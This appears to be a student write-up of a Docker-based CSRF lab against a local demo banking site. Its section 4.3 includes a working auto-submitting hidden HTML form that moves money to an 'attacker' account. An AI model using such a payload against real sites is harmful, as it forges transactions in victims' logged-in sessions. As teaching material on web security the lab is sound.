# CSRF

[Document for CSRF Lab](https://app.box.com/s/wl3kmlkiuzjn9wvnyv65bgbt1xt8f4mw)

## Preparation

Go to security_lab/csrf on command prompt and enter `docker-compose up --build`

Then, in the upper prompt, enter `docker exec -it client sh -l` to execute the Ubuntu of client.

![cmd_client](/Week%208/CSRF/img/cmd_client.png)

Will the Ubuntu of client, use `cat /tmp/hosts >> /etc/hosts` to append hostname configuration lines from /tmp/hosts to the end of /etc/hosts file.

Execute tail command to make sure those 2 lines exist in the /etc/hosts file `tail -n5 /etc/hosts`

![tail](/Week%208/CSRF/img/tail.png)

## 4.2 Conducting the Transaction

### a

Fire up Firefox inside the web-client container, enter <http://mysite.com/login.php> to login with credentials (admin, password).

![login](/Week%208/CSRF/img/login.png)

After successfully login, enter amount and the receiver’s name, click Transfer to proceed doing the transaction.

![logged](/Week%208/CSRF/img/logged.png)

Transfered successed then open network tab on developer tool to view request/response headers. Watchout the cookie

![cookie](/Week%208/CSRF/img/cookie.png)

## 4.3 Cross-Site-Request-Forgery

By observing page with Inspector in Developer Tool, the attacker forge the request by creating a hidden form that will be submitted automatically when loaded. This form is stored as tricky.html hosted on <http://darksite.com> that setup by the attacker.
Attacker can send an email with a link that whenever user clicks the link, an amount of money from admin’s account will be transferred to the attacker.

Enter <http://darksite.com/tricky.html> to simulate the mentioned scenario.
Explain the reason why attacker can succeed with this forgery request.

Now look at the source code of tricky.html. As you can see, the attacker are trying to use CSRF to attack the opening <http://mysite.com> from user. Using the current cookie to bypass the web_server to counterfeit the transfer which will transfer to attacker 50 values just by a URL.

```html
<!-- malicious.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF Attack Demo</h1>
  <form id="csrf-form" action="http://mysite.com/transfer.php" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="50">
    <button type="submit" name="transfer" value="transfer">
  </form>
  <script type="text/javascript">
    // Submit the form automatically on page load
    document.getElementById("csrf-form").submit();
  </script>
</body>
</html>
```

Even the cookie are the same due to the CSRF attack!

![attackercookie](/Week%208/CSRF/img/attackercookie.png)

## 4.4. Trying to attack directly without forgery request

### a

Start an independent docker container by executing:

`docker run -p 6080:80 --net=net-10.9.0.0 -v ${HOME}/shm:/dev/shm dorowu/ubuntu-desktop-lxde-vnc`

### b

Open browser then enter <http://localhost:6080> in the address bar to access GUI desktop of the newly created docker container.

### c

Open firefox inside the docker container GUI, enter http://darksite.com/tricky.html. How does the
transaction finish? Explain your observation.